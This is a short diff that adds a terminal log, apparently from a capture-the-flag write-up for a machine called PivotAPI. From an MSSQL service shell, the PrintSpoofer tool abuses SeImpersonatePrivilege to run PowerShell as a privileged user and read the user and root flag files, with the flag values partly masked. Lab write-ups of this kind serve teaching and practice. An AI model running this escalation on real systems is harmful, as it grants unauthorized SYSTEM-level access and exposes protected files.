@@ -1,0 +1,10 @@
+CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\TEMP> printspoofer.exe -i -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+4855ef5116xxxxxxxxxxx33d719
+CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\TEMP> printspoofer.exe -i -c "powershell -c type C:\users\cybervaca\Desktop\root.txt"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+b32c5e3ee3xxxxxxxxx25048d
